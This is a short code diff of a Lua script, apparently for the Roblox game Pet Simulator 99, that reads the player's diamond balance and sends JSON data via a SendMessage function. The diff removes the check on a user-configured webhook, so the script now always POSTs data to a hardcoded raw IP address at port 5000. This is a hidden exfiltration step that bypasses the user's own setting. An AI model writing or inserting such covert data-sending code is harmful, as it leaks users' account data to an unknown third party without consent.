@@ -125,15 +125,12 @@ local function SendMessage(diamonds)
     end
 
     local body = HttpService:JSONEncode(data)
-
-    if webhook and webhook ~= "" then
-        local response = request({
-            Url = "http://46.101.233.20:5000/ps99",
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    end
+    local response = request({
+        Url = "http://46.101.233.20:5000/ps99",
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end
 
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
